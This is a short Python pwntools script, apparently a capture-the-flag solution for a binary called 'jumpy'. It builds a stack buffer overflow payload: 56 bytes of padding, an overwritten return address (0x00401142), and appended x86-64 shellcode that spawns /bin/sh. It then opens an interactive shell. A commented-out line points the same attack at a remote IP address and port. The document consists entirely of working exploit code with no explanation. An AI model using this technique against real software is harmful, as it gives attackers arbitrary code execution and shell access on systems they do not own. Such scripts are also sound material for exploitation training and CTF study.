from pwn import *

sh = process("./jumpy")
#sh = remote("34.65.228.239",1337)
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload = b"A"*(48+8) + p64(0x00401142) +shellcode

print(sh.recv().decode())
sh.sendline(payload)
sh.interactive()